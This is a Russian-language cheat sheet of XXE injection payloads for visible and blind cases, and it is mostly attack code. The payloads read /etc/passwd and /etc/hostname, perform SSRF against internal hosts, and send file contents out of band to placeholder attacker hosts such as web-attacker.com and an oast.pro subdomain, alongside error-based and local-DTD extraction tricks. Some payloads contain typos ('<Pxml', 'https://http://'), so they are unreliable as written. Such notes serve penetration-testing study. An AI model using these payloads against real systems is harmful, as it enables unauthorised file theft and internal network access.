
# 3.1. При видимой xxe
## 3.1.1. Проверка реакции на DTD-инъекции

##### Внедрение простой внутренней сущности:
```
<?xml version="1.0"?>
<!DOCTYPE test [ <!ENTITY xxe "TEST"> ]>
<root>&xxe;</root>
```
- Если в ответе появляется TEST, DTD разрешен.

##### Попытка загрузки внешней сущности:
```
<?xml version="1.0"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://attacker.com/payload"> ]>
<root>&xxe;</root>
```
- Если сервер отправляет запрос к attacker.com, внешние сущности разрешены.

##### Использование XXE для извлечения файлов
```
	<?xml version="1.0" encoding="UTF-8"?>
	<!DOCTYPE foo [
		<!ENTITY xxe SYSTEM "file:///etc/passwd">
	]>
	<stockCheck>
		<productId>&xxe;</productId>
	</stockCheck>
```

##### Использование XXE для SSRF-атак
```
	<?xml version="1.0" encoding="utf-8"?>
	<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal.vulnerable-website.com/"> ]>
	<stockCheck>
		<foo>&xxe;</foo>
	</stockCheck>
```

##### Использование параметризованных внешних сущностей
```
<Pxml version="1.0" encoding="utf-8"?>
<! DOCTYPE example [
	‹!ENTITY % xxe SYSTEM "https://*free.beeceptor.com/xxe_endpoint"›
	%xxe;
]>
<example> 
</examples
```


----
# 3.2. При blind xxe
## 3.2.1. Проверка реакции на DTD-инъекции

##### Обнаружение слепого XXE с использованием внеполосных (OAST) методов

###### Пингуем
```
<!DOCTYPE stockCheck [ 
	<!ENTITY xxe SYSTEM "http://web-attacker.com"> 
]>
<root>&xxe;</root>
```
или
```
<!DOCTYPE foo [ 
	<!ENTITY % xxe SYSTEM "http://web-attacker.com"> 
	%xxe; 
]>
```

Развиваем атаку делая полезную нагрузку у себя на сервере
```
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfile SYSTEM 'https://http://web-attacker.com/%file;'>">
```
- смотрим логи подключения

# Дополнительная информация

### Сущности параметров XML с CDATA
```
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % start "<![CDATA[">
  <!ENTITY % end "]]>">
  <!ENTITY % wrapper "<!ENTITY &#x25; send SYSTEM 'https://YOUR-SUBDOMAIN.oast.pro/?data=%start;%file;%end;'>">
  %wrapper;
]>
<root>%send;</root>
```
**Объяснение payload**
- `%file` — читает файл `/etc/passwd`.
- `%start` и `%end` — обрамляют данные в `CDATA`, чтобы избежать ошибок парсера из-за спецсимволов.
- `%wrapper` — создает сущность `%send`, которая отправляет содержимое файла на наш сервер через URL-параметр `data`.


### Использование слепого XXE для извлечения данных через сообщения об ошибках
```
<!ENTITY % file SYSTEM "file:///etc/passwd"> 
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>"> %eval; 
%error;
```
- Определяет параметрическую сущность XML с именем `file`, содержащую содержимое файла `/etc/passwd`.
- Использует `error`сущность, так что ее значение оценивается путем попытки загрузить несуществующий файл, что приводит к сообщению об ошибке, содержащему имя несуществующего файла, которое является содержимым файла `/etc/passwd`.

### Преобразование локального файла DTD для повторного использования
```
<!DOCTYPE foo [ 
	<!ENTITY % local_dtd SYSTEM "file:///usr/local/app/schema.dtd"> 
	<!ENTITY % custom_entity '
		<!ENTITY &#x25; file SYSTEM "file:///etc/passwd"> 
		 <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
		  &#x25;eval; 
		  &#x25;error; 
	'> 
	  
	  %local_dtd; 
]>
```
1. Загрузка локального DTD-файла
2. Изменение сущности в локальном файле `custom_entity`
3. Вызываем исключение в локальном dtd файле
4. Получаем ошибку с локального dtd файла включая конф. данные

